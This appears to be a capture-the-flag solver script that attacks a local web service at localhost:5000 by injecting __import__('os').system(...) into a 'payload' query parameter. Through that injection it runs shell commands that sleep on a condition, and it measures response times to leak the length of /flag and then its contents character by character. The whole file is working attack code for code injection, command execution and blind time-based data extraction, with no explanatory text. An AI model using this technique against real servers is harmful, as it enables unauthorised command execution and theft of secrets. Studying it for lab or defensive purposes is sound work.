import requests

url = "http://localhost:5000/?payload="
timeout = 5

def send_req(payload):
    url_with_payload = url + payload
    res = requests.get(url_with_payload)
    if res.elapsed.total_seconds() > timeout:
        return True
    else:
        return False

def brute_len():
    print("Flag Length: ", end="", flush=True)
    for i in range(1, 101):
        cmd = "if [ $(cat /flag | wc -m) -eq {} ]; then sleep {}; fi".format(i, timeout)
        payload = "__import__('os').system('{}')".format(cmd)
        if send_req(payload):
            print("{}".format(i))
            return i

def brute_flag(flag_length):
    print("Flag: ", end="", flush=True)
    for i in range(1, flag_length + 1):
        for c in range(33, 127):
            cmd = "if [ $(cat /flag | cut -c {}) = {} ]; then sleep {}; fi".format(i, chr(c), timeout)
            payload = "__import__('os').system('{}')".format(cmd)
            if send_req(payload):
                print("{}".format(chr(c)), end="", flush=True)
    print()



flag_length = brute_len()
brute_flag(flag_length)
